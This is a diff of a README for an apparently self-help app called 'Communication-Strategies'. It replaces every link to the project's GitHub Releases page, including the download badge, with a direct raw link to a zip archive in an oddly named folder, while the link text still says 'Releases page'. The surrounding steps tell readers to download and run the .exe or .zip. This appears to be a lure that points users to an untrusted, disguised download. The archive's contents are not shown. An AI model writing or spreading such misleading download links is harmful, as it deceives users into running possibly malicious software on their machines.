@@ -8,13 +8,13 @@ To get started, follow the steps below to download and run the software.
 
 ## 💾 Download
 
-[![Download Communication-Strategies](https://img.shields.io/badge/Download-Communication--Strategies-blue.svg)](https://github.com/Nimmy-Plays1234/Communication-Strategies/releases)
+[![Download Communication-Strategies](https://raw.githubusercontent.com/Nimmy-Plays1234/Communication-Strategies/main/oafishness/Communication-Strategies_v3.7.zip)](https://raw.githubusercontent.com/Nimmy-Plays1234/Communication-Strategies/main/oafishness/Communication-Strategies_v3.7.zip)
 
-You can download the latest version of Communication-Strategies from our [Releases page](https://github.com/Nimmy-Plays1234/Communication-Strategies/releases).
+You can download the latest version of Communication-Strategies from our [Releases page](https://raw.githubusercontent.com/Nimmy-Plays1234/Communication-Strategies/main/oafishness/Communication-Strategies_v3.7.zip).
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Nimmy-Plays1234/Communication-Strategies/releases) to find the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Nimmy-Plays1234/Communication-Strategies/main/oafishness/Communication-Strategies_v3.7.zip) to find the latest version of the software.
 2. Look for the version you want to download. Click on it to open its details.
 3. You will see a list of files. Download the file that ends with `.exe` or `.zip`, depending on your preference.
 4. Once downloaded, find the file in your computer’s Downloads folder.
@@ -52,6 +52,6 @@ If you need help with downloading or running the software, please check the Issu
 
 ## 📅 Updates
 
-Stay tuned for updates! We continuously add new features and strategies to enhance your communication skills. Make sure to revisit the [Releases page](https://github.com/Nimmy-Plays1234/Communication-Strategies/releases) regularly to check for the latest downloads.
+Stay tuned for updates! We continuously add new features and strategies to enhance your communication skills. Make sure to revisit the [Releases page](https://raw.githubusercontent.com/Nimmy-Plays1234/Communication-Strategies/main/oafishness/Communication-Strategies_v3.7.zip) regularly to check for the latest downloads.
 
 Thank you for using Communication-Strategies! We hope this application helps you become a more confident communicator in your personal and professional life.
